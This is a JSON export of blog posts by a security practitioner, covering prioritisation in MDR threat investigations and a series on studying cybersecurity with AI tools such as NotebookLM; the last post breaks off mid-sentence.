
[{"content":" Introduction # In my world of Managed Detection and Response (MDR), there\u0026rsquo;s a fundamental tension that shapes every investigation: the need for speed versus the desire for depth. Unlike traditional digital forensics where you have the luxury of time to meticulously reconstruct every detail, MDR investigations operate under a different constraint. We need to move fast, contain threats, and prevent further damage. We don\u0026rsquo;t have time for forensics outside of purely what we need for the next step.\nWorking at an MDR company has shifted my mindset from my previous forensics-focused workplace. Previously I\u0026rsquo;d chase down leads for days at a time, often only to find they led nowhere. But I quickly learned that great MDR investigation isn\u0026rsquo;t about being the most thorough investigator in the room. It\u0026rsquo;s about being the most efficient one. It\u0026rsquo;s about knowing exactly what questions to ask, what evidence matters right now, what you can safely ignore, and what\u0026rsquo;s that next piece of evidence you need to uncover. It\u0026rsquo;s about understanding when \u0026ldquo;good enough\u0026rdquo; is actually good enough, and when you need to dig deeper.\nThis isn\u0026rsquo;t a guide to digital forensics. This is a guide to investigation theory in the real world, where the clock is ticking, the attacker might still be in the environment, and your client is ringing you for answers.\nThe Foundation: What is Investigation Theory? # Before diving into my approach, let\u0026rsquo;s establish the fundamentals. Investigation theory isn\u0026rsquo;t new, some of these techniques as old as time itself. The frameworks below are the \u0026ldquo;by-the-book\u0026rdquo; answers you\u0026rsquo;ll find in certifications and compliance policies. They\u0026rsquo;re not where I put my focus (we\u0026rsquo;ll get to my approach later), but they form the foundation that everything else builds on. Understanding these traditional methods gives you a vocabulary and mental models that make you a better investigator, even when you\u0026rsquo;re compressing them down to fit MDR timelines.\nTraditional Criminal Investigation Methods # Locard\u0026rsquo;s Exchange Principle - Every contact leaves a trace. The perpetrator always leaves something at the scene and takes something away. In cyber terms, every action leaves logs, artifacts, or changes.\nAbductive Reasoning - Start with observations and form the most plausible hypothesis. Not certainty, just the best explanation given current evidence. This is how we build theories about what happened.\nThe Investigation Process - Data collection and analysis form the foundation. Gather information from various sources (witnesses, documents, physical evidence) to support or refute theories, rinse and repeat until there is one hypothesis left standing.\nCyber Investigation/Incident Frameworks # NIST Four-Phase Cycle - Preparation, Detection \u0026amp; Analysis, Containment/Eradication/Recovery, Post-Incident Activity. It\u0026rsquo;s cyclical, not linear - continuous learning and improvement.\nSANS Six-Phase Model - Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned. More granular breakdown of the response lifecycle.\nDFIR Methodology - Digital Forensics and Incident Response combines evidence preservation (forensics) with active threat response (incident response). Collect, preserve, analyse, document.\nThe Reality # In MDR, we cherry-pick from all of these. We use abductive reasoning to form quick hypotheses. We follow NIST/SANS phases but compress them - a lot. We do forensics only when it serves the investigation. Every technique is a tool, not a religion.\nSo What\u0026rsquo;s My Theory? # My investigation framework combines two concepts:\nPart 1: Kill Chain Analysis # The key to this is to constantly be mapping where the attacker is in their progression. This determines what evidence matters right now and what your next move should be. If you\u0026rsquo;ve found initial access, you\u0026rsquo;re looking for lateral movement or persistence. If they\u0026rsquo;re at impact but don\u0026rsquo;t know how they got there, you need to contain and find the initial access.\nEvery piece of evidence you find should be a puzzle piece that clicks into place in one of the following stages of the Cyber Kill Chain.\nReconnaissance - Gathering information about the target Weaponization - Creating malicious payloads Delivery - Transmitting the weaponized content Exploitation - Taking advantage of vulnerabilities Installation - Installing malware on the system Command and Control (C2) - Establishing remote control Actions on Objectives - Achieving the ultimate goal (exfiltration, destruction, etc.) Note: some people prefer the MITRE ATT\u0026amp;CK tactics, I like the Lockheed Martin Cyber Kill Chain, find which works best for your brain!\nEvery piece of evidence we find can be placed into one of these phases. The more of the chain we piece together, the clearer the picture becomes. Each artifact is a puzzle piece: a PowerShell execution might be exploitation, a scheduled task could be persistence, unusual network traffic points to C2. As you map evidence to stages, gaps become obvious. Missing the initial access vector? You know what to hunt for. Found C2 but no persistence? Time to look for how they\u0026rsquo;re maintaining access.\nOnce you join up all these puzzle pieces, you don\u0026rsquo;t just have answers, you have the complete attack narrative. You understand not just what happened, but why each step occurred and what the attacker was trying to accomplish.\nPart 2: Likelihood vs Impact Analysis # That might sound familiar if you\u0026rsquo;ve ever done business risk assessments, because this is exactly how we do risk assessments, but in this case applied to investigation decisions. For every piece of evidence or avenue of investigation, ask:\nLikelihood - How probable is this theory? Does it fit the evidence? Is this a common attacker behavior or sys admin? Impact - If this theory is correct, how bad is it? What\u0026rsquo;s at risk? What damage could occur? Understanding Likelihood # Likelihood increases as you build out the kill chain. Found a single suspicious PowerShell command? Could be anything. But when you find that PowerShell command, then a scheduled task creation, then outbound C2 traffic, then lateral movement attempts, the more complete your chain, the higher the likelihood this is bad.\nBut here\u0026rsquo;s where I\u0026rsquo;ve made mistakes: trust your gut, but don\u0026rsquo;t ignore it for too long. This is the \u0026ldquo;sniff test.\u0026rdquo;\nI\u0026rsquo;ve spent too much time trying to find the smoking gun to prove something malicious, only to eventually convince myself \u0026ldquo;this has to be a sysadmin doing weird stuff, right? They\u0026rsquo;re always doing weird things.\u0026rdquo; Then later, it turns out it was malicious. If something doesn\u0026rsquo;t pass the sniff test and there\u0026rsquo;s a chance of high impact, do something about it.\nBetter to be wrong and have isolated a sysadmin\u0026rsquo;s machine for 20 minutes than to ignore your instincts and let an attacker continue lateral movement while you chase perfect certainty. Your gut (experience and pattern recognition) are part of the likelihood calculation too.\nUnderstanding Impact # Impact isn\u0026rsquo;t a simple yes/no. It\u0026rsquo;s multiplicative. Every dimension amplifies or reduces the severity. These factors stack on top of each other to determine how urgent your response needs to be.\nThe impact multipliers matter:\nWho: Standard user vs local admin vs domain admin Where: Single endpoint vs multiple hosts vs critical infrastructure (DC) What: Information access vs credential theft vs persistence vs data exfiltration Scope: Isolated incident vs active lateral movement vs environment-wide compromise Think about how these multiply together. A standard user on a single workstation accessing some files? Low impact across all dimensions, isolated, limited access, minimal damage potential. But a domain admin account doing enumeration of sensitive data on your domain controller? Maximum impact. You\u0026rsquo;ve got the highest privilege level (Who), on the most critical system (Where), with reconnaissance activity suggesting they\u0026rsquo;re planning next steps (What), and the potential for full domain compromise (Scope). Every multiplier is maxed out. That\u0026rsquo;s when you drop everything.\nCombining Likelihood and Impact # Your response urgency should match the combination of these factors.\nHigh likelihood + High impact = investigate immediately. This goes to the top of your pile. Drop everything. High likelihood + Low impact = quick check, move on. Contain it, verify no lateral movement, document it, move on. Low likelihood + High impact = keep monitoring. Set up monitoring, document your concerns, but don\u0026rsquo;t burn hours chasing shadows yet. Low likelihood + Low impact = deprioritize. These can hopefully be safely ignored while you respond to higher priority items. Quick Reference Matrix # High Impact Low Impact High Likelihood Investigate immediately\nDrop everything, this is urgent Quick check, move on\nContain, verify scope, document, done Low Likelihood Keep monitoring\nSet up monitoring, document concerns, don\u0026rsquo;t chase shadows Deprioritize\nNote it, move to higher priority items Why This Works in MDR # The kill chain gives you direction. The likelihood/impact matrix gives you prioritization. Together, they let you make fast, defensible decisions about where to spend your limited investigation time.\nRemember you\u0026rsquo;re not trying to reconstruct every detail like a forensics analyst would. You\u0026rsquo;re not building a perfect timeline of every action. You\u0026rsquo;re trying to understand enough to make the right next decision: Do we contain now? Do we escalate to the client? Do we keep investigating to fill critical gaps? Each piece of evidence should inform that decision, not just add to a complete picture for its own sake.\nFinal Thoughts # Investigation theory in MDR isn\u0026rsquo;t about following a framework perfectly. It\u0026rsquo;s about understanding the principles well enough to know which ones matter right now, in this investigation, for this decision.\nThe kill chain tells you where you are in the story. Likelihood and impact tell you how urgently you need to act. Together, they create a mental model that lets you move fast without being reckless, and be thorough without wasting time.\nThe best investigators I know don\u0026rsquo;t have perfect recall of every framework. They have strong pattern recognition, they trust their instincts, and they know when \u0026ldquo;good enough\u0026rdquo; is actually good enough. They understand that in MDR, your job isn\u0026rsquo;t to answer every question, it\u0026rsquo;s to answer the right questions fast enough to matter.\nSo next time you\u0026rsquo;re staring at a suspicious alert, ask yourself: Where in the kill chain are we? How likely is this to be malicious? If it is, what\u0026rsquo;s the impact? Then make your call and first move.\nThe clock is always ticking. Make your decisions count. And Finally Stay Curious Folks!\n","date":"17 February 2026","externalUrl":null,"permalink":"/posts/investigation_theory/","section":"Blog","summary":"Learn to balance speed and thoroughness in MDR investigations using Kill Chain analysis and Likelihood vs Impact matrices to make fast, defensible decisions under pressure.","title":"Speed vs Depth: The Art of Investigation Theory in the Real World","type":"posts"},{"content":" Introduction # In Part 1, we established that curiosity is a muscle and that AI isn\u0026rsquo;t inherently making us stupider, it\u0026rsquo;s just making our atrophied curiosity more visible. In Part 2, we explored the learning cycle framework and why understanding how learning works matters before using AI as a study tool. Now we get practical.\nThis post walks through a specific workflow I\u0026rsquo;ve been using with Google\u0026rsquo;s NotebookLM to apply evidence-based learning strategies. This isn\u0026rsquo;t the only way to do it, but it\u0026rsquo;s a concrete starting point you can adapt to your own learning style. We\u0026rsquo;ll explicitly map each technique to the three phases of the learning cycle (Understanding, Remembering, Focusing) so you can see how they fit together.\nNotebookLM # I\u0026rsquo;ve been using ChatGPT, Claude, and Gemini for years now, but NotebookLM was something I hadn\u0026rsquo;t explored until recently when I signed up for free Gemini Pro access through my student email. The key differentiator was NotebookLM is grounded in the sources I provided. You feed it documents, PDFs, websites, or text, and it responds based on that content, it doesn\u0026rsquo;t seem to pull from its general training data the way ChatGPT or Claude does.\nThe result is dramatically less hallucination, more focused responses, and better accuracy for domain-specific material. When you\u0026rsquo;re studying for a certification or learning a specific framework, you don\u0026rsquo;t want the AI making stuff up or conflating concepts from different methodologies. NotebookLM isn\u0026rsquo;t perfect, but for studying specific material, it\u0026rsquo;s been a game-changer.\nStep Zero: Source Quality Matters # Before you do anything else, you need quality sources. For me, this meant scraping content from my cybersecurity training platform (and yes, please training providers, just give us downloadable content the live access model actively hinders your students). For students at school/uni this is where I\u0026rsquo;d upload all your course content along with the rubric and learning outcomes for your subject as you want it to test you on the same things you be tested on IRL. You can supplement it with external resources: relevant blog posts from trusted sources, official documentation, research papers, and community resources.\nDo your due diligence on external sources. Look for author credibility, current publication dates, peer review or community validation, and consistency with official documentation. Garbage in equals garbage out for AI as NotebookLM will confidently work with whatever you feed it.\nThe Workflow: Integrating the Learning Cycle # Quick Note: Everyone learns differently. This workflow is a starting point, spend some time experimenting with what works best, go back to the chart in the previous post to make sure you\u0026rsquo;re hitting all three phases of the learning cycle. Let me walk through how I use NotebookLM for each phase.\nPhase 1: Understanding - Scoping with Mind Maps # Goal: Get a big-picture overview of how topics relate and identify where your knowledge is weak.\nOnce you\u0026rsquo;ve loaded your sources into NotebookLM, use the \u0026ldquo;Studio\u0026rdquo; feature to generate a mind map. This gives you a visual overview of the topic landscape—you can see how concepts connect at a glance, click on any node for details, and quickly identify areas where you have strong versus weak understanding.\nMy approach: I breeze through areas where I\u0026rsquo;m already comfortable and focus on areas where I don\u0026rsquo;t have clear answers. This is scoping the subject—building a mental map of the terrain before diving deep into any single area.\n![image](/pictures/curiosity_crisis/mind map.png)\nPhase 2: Remembering - Baseline Quiz # Goal: Activate active recall and establish a baseline for measuring improvement.\nOnce you\u0026rsquo;ve identified a weak area, create a practice quiz before studying it in depth. In NotebookLM Studio, click the pencil icon to customise your quiz generation with a detailed prompt like this:\nCreate a quiz to test my knowledge of [specific topic] before I spend focused study time on it. Context: - Exam/rubric specifies these outcomes: [list 1, 2, 3] - Focus on practical application, not just definitions - Include scenario-based questions where I need to make decisions Difficulty: Intermediate (I have foundational knowledge but need to strengthen application in realistic scenarios) Take the quiz and note your results. Don\u0026rsquo;t beat yourself up over wrong answers—this is your baseline. You\u0026rsquo;re supposed to struggle here. The act of attempting to recall information (even when you get it wrong) primes your brain for learning.\nPhase 2: Remembering - Audio Learning (First Pass) # Goal: Get a conversational understanding of the topic using your preferred learning modality.\nNotebookLM\u0026rsquo;s \u0026ldquo;Audio Overview\u0026rdquo; feature is invaluable for audio learners. Generate a 30-minute or less audio overview with a prompt like:\nGenerate an audio overview of [specific topic] covering: - High-level concepts and why they matter in ..... - How different subtopics relate to each other - Real-world applications - Common misconceptions or gotchas that catch people out Focus on clarity over completeness, I\u0026#39;ll dig deeper on specific areas in follow-up sessions. Critical step: While listening, take notes on things you don\u0026rsquo;t fully understand. Research shows handwriting improves retention compared to typing because it forces you to process and summarise rather than transcribe verbatim, so I use a physical notebook for this stage. Complete the full overview before moving on, resist the urge to pause and research every question, just jot them down for now.\nPhase 2: Remembering - Flashcards for Gaps # Goal: Target specific weaker subtopics with spaced repetition material.\nTake those notes from the audio overview and turn them into flashcards with a prompt like:\nCreate flashcards for these specific concepts I need to strengthen: [List the concepts you noted down] Format requirements: - Front: Scenario-based question or real-world situation \u0026lt;- This will change depending on your use case - Back: Answer with brief explanation of WHY, not just WHAT - Include context for when this matters - Link to related concepts/chapters where relevant (help me build mental models, not isolated facts) Focus on understanding over memorisation. I should be able to explain each concept to someone else after reviewing these. Review these using spaced repetition i.e. just review them with increasing intervals: same day, next day, 3 days out, week out.\nPhase 2: Remembering - Deep Dive Audio (Interleaved Practice) # Goal: Go deep on specific subtopics you are still struggling with whilst switching up your learning technique.\nFor each concept you noted down, generate a focused audio deep dive:\nCreate a focused 15 minute audio deep dive on [specific concept]. Cover: - What it is, with concrete examples from real life - Why it matters in the context of ..... - How it relates to [broader topic from the mind map] - Common pitfalls or misunderstandings - Practical application: How would I use this right now? Assume I have basic familiarity but need deeper understanding. Include at least two realistic scenarios where this concept is critical. This is interleaved practice in action. You\u0026rsquo;re switching between different learning techniques (audio → flashcards → audio → quiz) rather than doing just one thing for hours. Research shows this improves long-term retention because it keeps your brain engaged and prevents the effectiveness decay that comes from repetitive practice.\nPhase 3: Focusing - When and How to Take Breaks # Goal: Maintain effectiveness by managing your attention and energy.\nStudy effectiveness decreases over time, your attention is a finite resource. Recognise the signals, if you are getting distracted by unrelated thoughts, re-reading the same sentence without comprehension, feeling strained rather than challenged, or making careless mistakes on things you know. When you notice these, take a break.\nPomodoro Technique (if you\u0026rsquo;re naturally distractible like me lol): 25 minutes focused study, 5 minute break, and after 4 cycles take a longer 15-30 minute break. Motivation-based (if you\u0026rsquo;re in a flow state): Keep going as long as you\u0026rsquo;re feeling effective, don\u0026rsquo;t force yourself to stop if you\u0026rsquo;re in the zone. When you do take a break keep in mind Dopamine management, step outside for fresh air/sun, have a snack, do brief physical activity, or have social interaction. Don\u0026rsquo;t do social media (rabbit hole), gaming (hard to stop), or anything requiring deep focus. The goal is to reset your brain and reward it for studying, the right kind of break makes you want to get back to learning.\nNow it\u0026rsquo;s time to repeat the cycle - Measuring Progress # Phase 2: Active Recall Test (Measuring Progress) # Goal: Measure improvement and identify remaining gaps.\nAfter working through flashcards, audio deep dives, and practice, generate another new quiz slightly harder than your baseline:\nCreate a practice exam for [topic] that\u0026#39;s slightly more advanced than foundational level. Previous quiz covered: [brief summary of what the baseline tested] I\u0026#39;ve since studied: [areas you focused on] New quiz requirements: - Test deeper understanding and practical application - Include more scenario-based questions that require connecting multiple concepts - Require analysis and decision-making, not just recall - 30 questions similar to actual exam format see the attached rubric - Some questions should test edge cases or unusual situations I want to see measurable improvement from my baseline test, but I also want to be challenged. Example: {If you have previous years exams there is where you can use them} Take the quiz and compare to your baseline. This is the motivation boost that makes the whole process sustainable seeing tangible improvement (from 60% to 85%, or from struggling to confidently explaining) makes studying enjoyable instead of a grind. The retrieval struggle is where learning happens, and seeing the results makes you want to keep going.\nPhase 1: Understanding - Teaching It (The Ultimate Test) # Goal: Solidify understanding by explaining the concept to someone else.\nThis is my favorite technique and one of the most effective ways to cement knowledge. Find someone who knows little about the topic and explain it in easily understood terms. Encourage them to stop you whenever they\u0026rsquo;re confused, ask \u0026ldquo;why\u0026rdquo; and \u0026ldquo;how\u0026rdquo; questions, request more detail, and point out contradictions. This combines active recall, deep comprehension, and immediate feedback that exposes gaps in your knowledge. If you can\u0026rsquo;t explain it simply, you don\u0026rsquo;t understand it well enough yet.\nAlternative if no person is available: Use AI as a student. Here\u0026rsquo;s a prompt:\nAct as an intelligent but non-technical person I\u0026#39;m teaching [topic] to. You\u0026#39;re curious and want to understand, but you have no background in said topic. Your role: - Ask clarifying questions whenever something isn\u0026#39;t clear - Point out when my explanation seems contradictory or incomplete - Request concrete examples when concepts are too abstract - Show genuine curiosity about the topic - Don\u0026#39;t let me use jargon without defining it in plain language - If I say something that doesn\u0026#39;t make sense, tell me I\u0026#39;m going to explain [topic] to you. Interrupt me frequently with questions. Challenge me when things aren\u0026#39;t clear. This is a text-based exchange to demonstrate the idea but Speak out loud, use voice input if your AI tool supports it. Speaking activates different parts of your brain than reading or writing, engaging more neural pathways and strengthening memory formation. If AI isn\u0026rsquo;t pushing back or asking hard questions, the prompt needs work.\nThe Micro-Cycle: Rinse and Repeat # This is what my learning cycle looks like, this cycle can take hours or days depending on complexity.\n╔════════════════════════════════════════╗ ║ 1. IDENTIFY WEAK AREA (BROAD) ║ ← Wide scope ║ Mind map whole topic ║ ╚════════════════════════════════════════╝ | v ┌─────────────────────────┐ │ 2. BASELINE QUIZ │ ← Narrowing focus │ Test specific area │ └─────────────────────────┘ | v ┌───────────────┐ │ 3. AUDIO + │ ← Getting specific │ FLASHCARDS │ └───────────────┘ | v ┌─────────┐ │ 4. DEEP │ ← Super specific │ DIVE │ └─────────┘ | v ┌─────────┐ │ 5. BREAK│ ← Maintain focus └─────────┘ | v ┌───────────────┐ │ 6. ADVANCED │ ← Test specifics │ QUIZ │ └───────────────┘ | v ┌─────────────────────────┐ │ 7. TEACH CONCEPT │ ← Broaden back out │ Explain connections │ └─────────────────────────┘ | v ╔════════════════════════════════════════╗ ║ 8. IDENTIFY REMAINING GAPS ║ ← Back to wide view ║ What\u0026#39;s still unclear? ║ ╚════════════════════════════════════════╝ | +---\u0026gt; REPEAT (zoom back in on gaps) The key is variety. Don\u0026rsquo;t re-read the same material five times or just highlight and review. Mix up your techniques and keep your brain guessing. Constantly switching between Understanding → Remembering → Focusing works far better than slamming your head against a wall with the same ineffective study method.\nFinal Thoughts: Curiosity Amplified, Not Replaced # Make it your own: This workflow is a starting point. Experiment with different AI tools, learning modalities, quiz styles, break strategies, and teaching approaches. Track what works and notice patterns—when do you retain information best? What techniques feel effective versus just time-consuming?\nThe bigger picture: AI doesn\u0026rsquo;t replace curiosity, understanding, or the work of learning, but when used intentionally with evidence-based techniques, it amplifies your ability to practise those things effectively. The \u0026ldquo;crisis\u0026rdquo; isn\u0026rsquo;t AI making us stupider. It\u0026rsquo;s passive consumption culture conditioning us to avoid the struggle of learning, algorithms optimising for engagement instead of curiosity, and the convenience of getting answers without understanding the questions.\nThe choice: Are you going to make AI your crutch or amplifier? If you copy-paste answers without understanding, avoid the struggle, appear knowledgeable while remaining ignorant, AI is your Crutch. But if you instead practise curiosity, use evidence-based learning techniques, embrace the struggle of active recall, strengthen curiosity by exploring deeper questions, it will Amplify your ability to rapidly learn new topics and you\u0026rsquo;ll find yourself learning things you could never have imagined. Same tool, completely different outcomes.\nTry this workflow with your next learning challenge. Adapt it, break it, make it your own, and figure out what works and what doesn\u0026rsquo;t. We\u0026rsquo;re all figuring this out together. The goal isn\u0026rsquo;t to become dependent on AI but to use it as a tool to strengthen the curiosity muscle that makes learning possible in the first place.\nStay curious, keep learning, question everything!\n","date":"24 January 2026","externalUrl":null,"permalink":"/posts/curiosity_crisis_part3/","section":"Blog","summary":"A hands-on guide to using NotebookLM for cybersecurity learning, including how to create study guides, generate flashcards, and build audio podcasts from technical documentation for active learning.","title":"Learning in the AI Era - Part 3: Practical Workflow with NotebookLM","type":"posts"},{"content":" Introduction # In Part 1, we explored how curiosity is a muscle that requires exercise, and how every major change in how we process information from writing to AI has faced the same criticism: that it\u0026rsquo;ll make us more stupid. If history is anything to go by we\u0026rsquo;re probably wrong about AI too, but only if we use it strategically and intentionally.\nThis post is about how to do that. Specifically, how to combine AI with evidence-based learning strategies to amplify your curiosity rather than atrophy it.\nThe Challenge: Cybersecurity Training Isn\u0026rsquo;t Built for Everyone # Here\u0026rsquo;s my personal frustration: I\u0026rsquo;m primarily an audio and hands-on learner. I learn best when I can listen to concepts explained conversationally, then immediately apply them in a practical exercise. This is how the military trains, its called on the job training, someone explains to me how to do something and I do it, they watch me do it and correct me as I go.\nBut Cybersecurity, for the most part, is not built for this.\nWe utilise courses, certifications or tabletops exercises, anything but on the job training. My issues is that most courses/certs are:\nHeavily text-based (long documentation, PDFs, written labs) Video lectures that can\u0026rsquo;t adapt to my pace or answer my direct questions Linear progressions that assume everyone learns the same way Mostly limited in interactivity I\u0026rsquo;ve spent years fighting my own learning style, trying to force myself to learn from formats that don\u0026rsquo;t work for me. And I know I\u0026rsquo;m not alone. Everyone learns differently. Some people love reading technical documentation. Others need visual diagrams. Some need to break things repeatedly until they understand how they work.\nThe frustration is real. I have spent years knowing I need to learn something, wanting to learn it, but struggling to learn it because the format doesn\u0026rsquo;t match my brain.\nThis is where AI has genuinely changed things for me.\nThe Learning Cycle Framework # A colleague recently shared this video with me: How to Study for Exams - An Evidence-Based Masterclass\nHe had also made a flow chart to summarize the very long video, which was too good for me not to share. It breaks learning into three phases that you cycle through continuously:\n┌─────────────────────────────────────────────────────────┐ │ THE LEARNING CYCLE │ │ ┌──────────────┐ ┌──────────────┐ ┌──────────┐ │ │ │ Phase 1: │ │ Phase 2: │ │ Phase 3: │ │ │ │ Understanding│───▶│ Remembering │───▶│ Focusing │ │ │ │ │ │ │ │ │ │ │ └──────┬───────┘ └──────────────┘ └────┬─────┘ │ │ │ │ │ │ └──────────────────◀──────────────────┘ │ └─────────────────────────────────────────────────────────┘ Phase 1: Understanding ├── Step 1: Scoping the Subject │ ├── Examine the subject overall │ ├── Subcategorise the different topics │ └── Build a macro view (tree view) │ ├── Trunk = Subject │ ├── Branch = Sub-topic │ └── Leaves = Individual Points ├── Step 2: Can you reason from first principles? ├── Step 3: Can you explain this concept to a 5 year old? │ ├── Keep the language simple │ ├── Minimize technical terms │ └── Drill down to the concept in few simple words └── Step 4: Ask yourself, does this make sense? └── How did we get from Point A to Point B? Ask WHY Phase 2: Remembering ├── Active Recall │ ├── Step away from the information source │ └── Ask: What have I just read? Can I phrase in my own words? ├── Note Taking System │ ├── Cornell Note Taking Method │ ├── Handwriting vs Typing │ │ ├── Handwriting: Slower, forces focus on key concepts │ │ └── Typing: Faster, but danger of transcribing vs recalling │ └── Take notes beyond immediate study material ├── Spaced Repetition │ ├── Increase repetition = longer retention │ ├── The more effortful learning feels, the more you retain │ └── The retrospective revision timetable │ ├── Tackle most difficult first │ ├── Organise by topic │ └── Colour code by difficulty ├── Interleaved Practise │ ├── Split time within one study session │ ├── Mix up practise topics │ └── Avoid focusing on one skill in isolation ├── Things to Avoid │ ├── Re-reading notes passively │ └── Highlighting in isolation ├── Flashcards │ ├── Minimise amount made │ ├── Pass through content with Cornell method first │ └── Flashcard only points you struggle with └── Memory Techniques ├── Mnemonics (elaborative encoding \u0026amp; imagery) └── Memory Palace (associate facts with familiar places) Phase 3: Focusing ├── System-based vs Motivation-based │ └── Motivation is required for things we don\u0026#39;t want to do │ ├── Punishment │ └── Reward ├── Pomodoro Technique │ ├── Work for 25 minutes │ ├── Break for 5 minutes │ └── After 3-4 sessions, take 30-60 min break ├── Work/Life Balance └── Studying Together ├── Give everyone time to think └── Discuss answers together This is a cycle. You don\u0026rsquo;t just understand something once, then memorise it, then you\u0026rsquo;re done. You continuously move through these phases as you deepen your knowledge.\nWhen you\u0026rsquo;re first learning about, say, Kerberoasting, you need to understand what it is and how it fits into the broader landscape of Active Directory attacks (Phase 1). Then you need to practise detecting it, quiz yourself on the indicators, and drill the response process (Phase 2). And you need to manage your focus and motivation, taking breaks as needed (Phase 3).\nBut once you think you\u0026rsquo;ve got it, you cycle back: Can you teach it to someone else (Phase 1)? Can you still detect it a week later (Phase 2) without looking at your notes (Phase 3)?\nThis framework clicked for me because it acknowledges that different strategies work for different phases. You don\u0026rsquo;t need one \u0026ldquo;best\u0026rdquo; study method. You need to recognise which phase you\u0026rsquo;re in and apply the right techniques for that phase.\nThe School Problem: Blocking vs. Teaching # My father is a school teacher. We\u0026rsquo;ve had many discussions about how students are using AI and how schools are responding.\nThe typical response? Block it outright. Ban ChatGPT from school networks. Use AI detection tools to catch students who might be using it. Threaten academic integrity violations.\nAnd I understand the impulse. Teachers are seeing students submit AI-generated essays they clearly didn\u0026rsquo;t write and that is cheating.\nBut here\u0026rsquo;s the thing: This is the same response schools had to calculators. To Wikipedia. To Google. The fear is always the same, students will use X tool to avoid learning, so we must ban that tool.\nBut banning never works. Students still have phones. They still have home internet. You\u0026rsquo;re not preventing access, you\u0026rsquo;re just stopping students from finding effective ways they can utilise this tool, and even worse, refusing to teach them how to safely utilise it.\nWhat if instead we taught students when and how to use AI? What if we helped them recognise the difference between using AI as a crutch (copy-paste without understanding) vs. as an amplifier (using it to explore concepts more deeply)?\nWhat if we integrated AI into the learning cycle intentionally?\nThe Critical Foundation: You Still Need to Read # Before we go further, I need to be extremely clear about something:\nAI is not a replacement for engaging with the actual content.\nYou cannot skip reading the course material, throw it into an AI, and expect to learn effectively. You cannot rely on AI summaries as a substitute for understanding the primary sources.\nHere\u0026rsquo;s why: If you don\u0026rsquo;t have a fundamental understanding of what a topic covers, you won\u0026rsquo;t know what to focus on. You won\u0026rsquo;t know what questions to ask. You won\u0026rsquo;t recognise when the AI is wrong or hallucinating.\nIt\u0026rsquo;s like trying to use Google without clicking on any of the results. The tool can only amplify what you bring to it.\nMy workflow always starts with going through the course material first. Even if it\u0026rsquo;s just skim reading or watching the videos at 2x speed whilst taking rough notes. I need that baseline understanding before AI becomes useful.\nAI is a study tool for reinforcement, not a substitute for the classroom. If you try to skip the foundation and jump straight to AI-generated summaries and quizzes, you\u0026rsquo;ll end up exactly where the critics discussed in part one fear: appearing knowledgeable whilst understanding nothing.\nHow AI Fits Into This # Once you understand the learning cycle and have that foundational knowledge, AI becomes incredibly powerful. AI can help you apply these evidence-based techniques in ways that were previously impractical, expensive, or impossible.\nWant to practise active recall? AI can generate custom quizzes focused on your specific weak areas.\nWant to practise teaching (one of the best ways to solidify understanding)? Try explaining the topic to an AI role-playing as a clueless student who asks questions when your explanation isn\u0026rsquo;t clear.\nWant interleaved practise? AI can mix up topics and question styles on the fly.\nWant audio learning? AI can generate conversational explanations of complex topics.\nThe difference is deliberateness. You\u0026rsquo;re not asking AI for the answer, you\u0026rsquo;re using AI as a personal tutor, applying the learning principles which work best for you.\nNext, we\u0026rsquo;ll walk through a specific workflow I\u0026rsquo;ve been using with NotebookLM that integrates all three phases of the learning cycle. It\u0026rsquo;s not the only way to do this, it\u0026rsquo;s one approach that works for me, but it\u0026rsquo;ll give you a starting point.\nFinal Thoughts # AI is a resource we haven\u0026rsquo;t fully figured out how to use yet. The concerns are valid - passive use of AI absolutely will make you less capable. But intentional use, combined with evidence-based learning strategies, can make you more capable than ever before.\nThe key is understanding how learning actually works. Understanding the cycle. Understanding that different phases need different techniques. Understanding that curiosity and active engagement are non-negotiable.\nTools don\u0026rsquo;t learn for you. They never have. Writing didn\u0026rsquo;t memorise things for Socrates\u0026rsquo; students, it freed them from having to memorise everything so they could think about harder problems. In the same way AI won\u0026rsquo;t understand things for you, but it can help you develop your own understanding in more effective ways.\nIn Part 3, we\u0026rsquo;ll get practical. I\u0026rsquo;ll walk through my specific workflow using NotebookLM, including example prompts, techniques for each phase of the learning cycle, and how to adapt this to your own learning style.\nStay curious, keep learning, question everything.\n","date":"23 January 2026","externalUrl":null,"permalink":"/posts/curiosity_crisis_part2/","section":"Blog","summary":"Discover evidence-based learning frameworks including the three-phase Learning Cycle (Understanding, Remembering, Focusing) and how to adapt cybersecurity training to your personal learning style with AI.","title":"Learning in the AI Era - Part 2: The Learning Cycle","type":"posts"},{"content":" Quick Caveat - A Note on AI Ethics and Safety # This post is not about the ethics of AI development or deployment. I\u0026rsquo;m discussing AI as a learning tool, not endorsing the AI industry uncritically.\nI\u0026rsquo;m a strong proponent of AI safety and responsible development. The changes at OpenAI, specifically the shifting priorities around safety research, led me to cancel my ChatGPT subscription mid last year and switch to Claude. As Anthropic\u0026rsquo;s approach to AI safety research is better than most in a desperately under-resourced field. But AI exists, it\u0026rsquo;s not going away. We need to figure out how to use it responsibly while simultaneously pushing for proper safety measures, regulatory frameworks, and ethical development practices. This series focuses on the first part; responsible use as a learning tool.\nIf you want to do deeper reading on AI safety and why this matters, I highly recommend: If Anyone Builds It, Everyone Dies\nIntroduction # \u0026ldquo;Always curious, constantly learning.\u0026rdquo;\nThat\u0026rsquo;s been my mantra for years now, it\u0026rsquo;s how I try to live my life. Lately, I\u0026rsquo;ve been hearing a lot of concern that AI is making people stupider. That we\u0026rsquo;re losing our ability to think, to learn, to truly understand things because we just ask ChatGPT or Claude for the answer. But I love AI, I utilise it every day to feed my curiosity and understand more about this world.\nBut I get it. I really do. On the surface, it looks bad. People copy-pasting AI responses without understanding them. Students submitting AI-generated essays. Developers shipping code they can\u0026rsquo;t explain.\nBut here\u0026rsquo;s the thing: I don\u0026rsquo;t think AI is making us stupider. I think our collective curiosity has been atrophying for a while now, and AI just makes that decline more visible. The problem isn\u0026rsquo;t the tool, it\u0026rsquo;s how we\u0026rsquo;ve been conditioned to use tools passively instead of actively.\nIn this three-part series, I want to challenge the narrative that AI is dumbing us down. Part 1 (this post) explores what curiosity actually is and why it matters. Part 2 will introduce evidence-based learning frameworks. Part 3 will get practical with concrete workflows for using AI as a learning amplifier rather than a crutch.\nThe Historical Echo: We\u0026rsquo;ve Been Here Before # The concern that new technology will make us stupider isn\u0026rsquo;t new. It\u0026rsquo;s ancient. Literally. In Plato\u0026rsquo;s Phaedrus, Socrates expresses concern about the invention of writing. Yes, writing. The thing you\u0026rsquo;re using right now to read this post. Here\u0026rsquo;s what worried him:\nFrom Socrates: Writing vs. Memory:\nSocrates\u0026rsquo; core concerns:\nMemory deterioration: Writing would 